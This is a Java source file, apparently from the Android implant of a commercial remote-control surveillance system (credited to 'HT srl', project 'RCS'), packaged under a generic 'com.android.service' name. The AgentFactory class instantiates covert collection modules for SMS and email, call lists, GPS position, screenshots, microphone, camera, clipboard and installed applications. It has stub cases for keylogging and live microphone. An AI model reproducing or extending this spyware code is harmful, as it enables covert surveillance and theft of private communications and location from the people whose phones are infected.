/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentFactory.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import com.android.service.auto.Cfg;
import com.android.service.interfaces.AbstractFactory;
import com.android.service.util.Check;

public class AgentFactory implements AbstractFactory<AgentBase, Integer> {
	private static final String TAG = "AgentFactory"; //$NON-NLS-1$

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	public AgentBase create(Integer agentType) {
		AgentBase a = null;

		switch (agentType) {
		case AgentType.AGENT_SMS:
			a = new AgentMessage();
			break;

		case AgentType.AGENT_TASK:
			a = new AgentTask();
			break;

		case AgentType.AGENT_CALLLIST:
			a = new AgentCallList();
			break;

		case AgentType.AGENT_DEVICE:
			a = new AgentDevice();
			break;

		case AgentType.AGENT_POSITION:
			a = new AgentPosition();
			break;

		case AgentType.AGENT_CALL:
			break;

		case AgentType.AGENT_CALL_LOCAL:
			break;

		case AgentType.AGENT_KEYLOG:
			break;

		case AgentType.AGENT_SNAPSHOT:
			a = new AgentSnapshot();
			break;

		case AgentType.AGENT_URL:
			break;

		case AgentType.AGENT_IM:
			break;

		case AgentType.AGENT_EMAIL:
			a = new AgentMessage();
			break;

		case AgentType.AGENT_MIC:
			a = new AgentMic();
			break;

		case AgentType.AGENT_CAM:
			a = new AgentCamera();
			break;

		case AgentType.AGENT_CLIPBOARD:
			a = new AgentClipboard();
			break;

		case AgentType.AGENT_CRISIS:
			a = new AgentCrisis();
			break;

		case AgentType.AGENT_APPLICATION:
			a = new AgentApplication();
			break;

		case AgentType.AGENT_LIVEMIC:
			break;

		default:
			if (Cfg.DEBUG) {
				Check.log(TAG + " Error (factory): unknown type") ;//$NON-NLS-1$
			}
			break;
		}

		return a;
	}

}
